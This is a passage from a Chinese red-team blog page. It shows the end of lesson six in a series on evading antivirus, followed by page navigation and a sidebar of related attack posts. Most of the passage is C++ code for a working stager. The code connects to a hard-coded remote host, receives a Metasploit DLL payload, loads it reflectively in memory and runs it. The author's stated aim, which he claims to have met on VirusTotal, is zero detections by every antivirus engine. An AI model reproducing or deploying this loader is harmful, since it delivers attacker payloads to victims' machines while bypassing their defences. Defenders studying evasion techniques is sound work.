	<span class="k">if</span> <span class="p">(</span><span class="n">socks</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[*]Socket Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">sListenPort</span><span class="p">);</span>
	<span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">S_un</span><span class="p">.</span><span class="n">S_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"192.168.170.138"</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[*]Bind Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">2650</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>

	<span class="n">ZeroMemory</span><span class="p">(</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="n">PAYLOAD_SIZE</span><span class="p">);</span>

	
	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">bFileBuffer</span><span class="p">,</span><span class="mi">5120</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">closesocket</span><span class="p">(</span><span class="n">socks</span><span class="p">);</span>
	<span class="p">}</span>


	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span> 

<span class="c1">// 打开文件并获取大小</span>
<span class="n">DWORD</span> <span class="nf">OpenBadCodeDLL</span><span class="p">(</span><span class="n">HANDLE</span> <span class="o">&amp;</span> <span class="n">hBadCodeDll</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwszBadCodeFileName</span><span class="p">){</span>
	<span class="n">DWORD</span> <span class="n">dwHighFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">dwLowFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="c1">// 打开文件</span>
	<span class="n">hBadCodeDll</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">lpwszBadCodeFileName</span><span class="p">,</span><span class="n">GENERIC_READ</span><span class="p">,</span><span class="n">FILE_SHARE_READ</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_ALWAYS</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hBadCodeDll</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
		<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="n">dwLowFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hBadCodeDll</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwHighFileSize</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">dwLowFileSize</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	
	<span class="n">HMEMORYMODULE</span> <span class="n">hModule</span><span class="p">;</span>
	<span class="n">Module</span> <span class="n">DllMain</span><span class="p">;</span>
	<span class="n">bFileBuffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BYTE</span><span class="p">[</span><span class="n">PAYLOAD_SIZE</span><span class="p">];</span>
	<span class="n">GetPEDLL</span><span class="p">();</span>
	<span class="c1">// 导入PE文件</span>
	<span class="n">hModule</span> <span class="o">=</span> <span class="n">MemoryLoadLibrary</span><span class="p">(</span><span class="n">bFileBuffer</span><span class="p">);</span>
	<span class="c1">// 如果加载失败，就退出</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hModule</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">delete</span> <span class="p">[]</span> <span class="n">bFileBuffer</span><span class="p">;</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="c1">// 获取msg导出函数地址</span>
	<span class="n">DllMain</span> <span class="o">=</span> <span class="p">(</span><span class="n">Module</span><span class="p">)</span><span class="n">MemoryGetProcAddress</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span><span class="s">"DllMain"</span><span class="p">);</span>
	<span class="c1">// 运行msg函数</span>
	<span class="n">DllMain</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="c1">// 释放资源</span>
	<span class="n">DWORD</span> <span class="n">dwThread</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">DllMain</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwThread</span><span class="p">);</span>
	
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span>
	
	<span class="n">MemoryFreeLibrary</span><span class="p">(</span><span class="n">hModule</span><span class="p">);</span>
	<span class="c1">// 释放PE内存</span>
	<span class="n">delete</span> <span class="p">[]</span> <span class="n">bFileBuffer</span><span class="p">;</span>
	<span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
<span class="p">}</span>

</code></pre></div></div>

<p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>

<p>实现效果如下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/909cbbf1fff8d5d4652e00b6628e323a.png" alt="2020-01-03-13-07-19" /></p>

<h2 id="0x04-总结">0x04 总结</h2>

<p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p>

<p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>

<p>老样子，V站查杀一下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dfaa7e139b9ba7e150c830127025cabb.png" alt="2020-01-03-13-07-29" /></p>

<p>挑战了全球的AV，全部通过</p>

<p>https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</p>

<p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的”不可能”。</p>
-->
          <!---->
          本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。
          <p>
            <a class="post-link" href="/archivers/2020-01-02/1">Read More »</a>
          </p>
        </div>
      </li>
    
  </ul>
  
  <!-- Pagination links -->
<div class="pagination">
  
    <a href="/page4" class="previous">PREV</a>
  
  <span class="page_number ">5 of 34</span>
  
    <a href="/page6" class="next">NEXT</a>
  
</div>

</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
